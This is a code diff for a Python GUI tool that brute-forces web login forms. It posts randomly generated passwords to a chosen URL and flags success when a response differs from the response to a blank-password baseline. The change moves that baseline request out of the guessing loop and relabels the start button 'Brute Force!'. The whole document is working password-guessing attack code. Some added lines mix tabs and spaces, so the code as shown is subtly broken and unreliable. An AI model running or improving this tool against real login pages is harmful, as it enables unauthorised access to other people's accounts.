@@ -26,10 +26,8 @@ def gen(length, chars):
     return "".join(secrets.choice(chars) for x in range(length))
 
 # Function to start brute force
-def bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars):
+def bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars, text):
     count = 0
-    status = requests.get(url)
-    status.raise_for_status()
 
     dupe = []
 
@@ -44,11 +42,8 @@ def bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars):
         message = [(usrnmvalue, usr), (pswrdvalue, pas)]
         req = requests.post(url, data=message)
 
-        test = [(usrnmvalue, usr), (pswrdvalue, " ")]
-        get = requests.post(url, data=test)
-
         count = count + 1
-        if get.text != req.text:
+        if text != req.text:
             print("Success!")
             print("Found password after " + str(count) + " times")
             print("Username:", usr, "Password:", pas)
@@ -63,7 +58,7 @@ while True:
         break
 
     # If go button is pressed
-    if event == "go":
+    if event == "Brute Force!":
         url = values[0]
         usr = values[1]
         usrnmvalue = values[2]
@@ -90,6 +85,13 @@ while True:
 
         chars = param1 + param2 + param3
 
-        bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars)
+        test = [(usrnmvalue, usr), (pswrdvalue, " ")]
+        get = requests.post(url, data=test)
+	text = get.text
+    	
+	status = requests.get(url)
+    	status.raise_for_status()
+
+        bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars, text)
 
 window.close()
